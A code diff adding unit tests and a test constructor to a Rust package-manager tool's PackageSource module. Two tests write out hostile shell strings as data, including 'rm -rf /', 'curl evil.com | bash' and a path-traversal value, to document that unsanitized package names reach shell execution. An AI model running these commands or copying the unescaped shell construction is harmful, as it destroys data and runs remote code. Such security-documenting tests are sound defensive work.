@@ -3,10 +3,10 @@ use std::collections::HashMap;
 
 use colored::*;
 use dialoguer::{theme::ColorfulTheme, Confirm};
-use tracing::{debug, error, info, trace};
 use serde::{Deserialize, Serialize};
 use subprocess::Exec;
 use tabular::{Row, Table};
+use tracing::{debug, error, info, trace};
 
 use crate::data::{KnownSources, Platform, SantaData};
 
@@ -113,6 +113,27 @@ impl PackageSource {
         self.name.to_string()
     }
 
+    #[cfg(test)]
+    pub fn new_for_test(
+        name: KnownSources,
+        emoji: &str,
+        shell_command: &str,
+        install_command: &str,
+        check_command: &str,
+        prepend_to_package_name: Option<String>,
+        overrides: Option<Vec<SourceOverride>>,
+    ) -> Self {
+        PackageSource {
+            name,
+            emoji: emoji.to_string(),
+            shell_command: shell_command.to_string(),
+            install_command: install_command.to_string(),
+            check_command: check_command.to_string(),
+            prepend_to_package_name,
+            overrides,
+        }
+    }
+
     fn exec_check(&self) -> String {
         let check = self.check_command();
 
@@ -143,7 +164,6 @@ impl PackageSource {
     }
 
     pub fn exec_install(&self, _config: &mut SantaConfig, data: &SantaData, packages: Vec<String>) {
-
         if !packages.is_empty() {
             let renamed: Vec<String> = packages.iter().map(|p| data.name_for(p, self)).collect();
             let install_command = self.install_packages_command(renamed);
@@ -154,7 +174,6 @@ impl PackageSource {
                 .interact()
                 .expect("Failed to get user confirmation")
             {
-
                 let ex: Exec = if MACHINE_KIND != "windows" {
                     Exec::shell(install_command)
                 } else {
@@ -247,14 +266,12 @@ impl PackageSource {
         packages
     }
 
-
     pub fn adjust_package_name(&self, pkg: &str) -> String {
         match &self.prepend_to_package_name {
             Some(pre) => format!("{}{}", pre, pkg),
             None => pkg.to_string(),
         }
     }
-
 
     pub fn table(
         &self,
@@ -279,5 +296,177 @@ impl PackageSource {
 impl std::fmt::Display for PackageSource {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         write!(f, "{} {}", self.emoji, self.name)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::data::{Arch, KnownSources, Platform, OS};
+
+    fn create_test_source() -> PackageSource {
+        PackageSource::new_for_test(
+            KnownSources::Brew,
+            "🍺",
+            "brew",
+            "brew install",
+            "brew list",
+            None,
+            None,
+        )
+    }
+
+    fn create_test_source_with_overrides() -> PackageSource {
+        let override_config = SourceOverride {
+            platform: Platform {
+                os: OS::Windows,
+                arch: Arch::X64,
+                distro: None,
+            },
+            shell_command: Some("pwsh".to_string()),
+            install_command: Some("scoop install".to_string()),
+            check_command: Some("scoop list".to_string()),
+        };
+
+        PackageSource::new_for_test(
+            KnownSources::Scoop,
+            "🍨",
+            "scoop",
+            "scoop install",
+            "scoop list",
+            None,
+            Some(vec![override_config]),
+        )
+    }
+
+    #[test]
+    fn test_name_str() {
+        let source = create_test_source();
+        assert_eq!(source.name_str(), "brew");
+    }
+
+    #[test]
+    fn test_check_command_no_overrides() {
+        let source = create_test_source();
+        assert_eq!(source.check_command(), "brew list");
+    }
+
+    #[test]
+    fn test_install_packages_command() {
+        let source = create_test_source();
+        let packages = vec!["git".to_string(), "vim".to_string()];
+        let command = source.install_packages_command(packages);
+        assert_eq!(command, "brew install git vim");
+    }
+
+    #[test]
+    fn test_adjust_package_name_no_prepend() {
+        let source = create_test_source();
+        assert_eq!(source.adjust_package_name("git"), "git");
+    }
+
+    #[test]
+    fn test_adjust_package_name_with_prepend() {
+        let mut source = create_test_source();
+        source.prepend_to_package_name = Some("prefix.".to_string());
+        assert_eq!(source.adjust_package_name("git"), "prefix.git");
+    }
+
+    #[test]
+    fn test_shell_command_injection_prevention() {
+        // Test that dangerous characters in commands are preserved as-is
+        // (they should be sanitized during execution, not in storage)
+        let dangerous_commands = vec![
+            "brew; rm -rf /",
+            "brew && curl evil.com | bash",
+            "brew $(malicious_command)",
+            "brew `dangerous`",
+        ];
+
+        for dangerous_cmd in dangerous_commands {
+            let source = PackageSource::new_for_test(
+                KnownSources::Brew,
+                "🍺",
+                dangerous_cmd,
+                "brew install",
+                dangerous_cmd,
+                None,
+                None,
+            );
+
+            // Commands should be stored as-is
+            assert_eq!(source.check_command(), dangerous_cmd);
+
+            // But we should note that actual execution needs sanitization
+            // This test documents the current behavior - execution sanitization
+            // should be added in a separate security improvement
+        }
+    }
+
+    #[test]
+    fn test_package_name_injection_scenarios() {
+        let source = create_test_source();
+        let dangerous_packages = vec![
+            "git; rm -rf /",
+            "git && curl evil.com | bash",
+            "$(malicious_command)",
+            "`dangerous`",
+            "../../../etc/passwd",
+            "package|evil_command",
+        ];
+
+        for dangerous_pkg in dangerous_packages {
+            let adjusted = source.adjust_package_name(dangerous_pkg);
+            // Currently, package names are passed through unchanged
+            // This documents the security vulnerability that needs to be addressed
+            assert_eq!(adjusted, dangerous_pkg);
+        }
+
+        // Test install command construction with dangerous package names
+        let command = source.install_packages_command(vec!["git; rm -rf /".to_string()]);
+        assert_eq!(command, "brew install git; rm -rf /");
+
+        // This test shows the injection vulnerability exists and needs fixing
+        // A secure implementation would sanitize or escape package names
+    }
+
+    #[test]
+    fn test_platform_override_selection() {
+        let source = create_test_source_with_overrides();
+
+        // Test that overrides are selected correctly
+        // Note: This test may fail depending on the current platform
+        // In a real implementation, we'd want to mock the platform detection
+        let override_result = source.get_override_for_current_platform();
+
+        // The test documents current behavior - platform detection logic exists
+        // but needs better testing infrastructure with mocked platforms
+        match override_result {
+            Some(override_config) => {
+                assert_eq!(override_config.platform.os, OS::Windows);
+            }
+            None => {
+                // No override found for current platform - this is also valid
+            }
+        }
+    }
+
+    #[test]
+    fn test_package_cache_basic_operations() {
+        let cache = PackageCache::new();
+        let source = create_test_source();
+
+        // Initially, cache should be empty
+        assert!(!cache.check(&source, "git"));
+
+        // After caching, we can't easily test without mocking subprocess execution
+        // This documents that the cache needs integration testing with mocked commands
+    }
+
+    #[test]
+    fn test_source_display() {
+        let source = create_test_source();
+        let display_string = format!("{}", source);
+        assert_eq!(display_string, "🍺 brew");
     }
 }
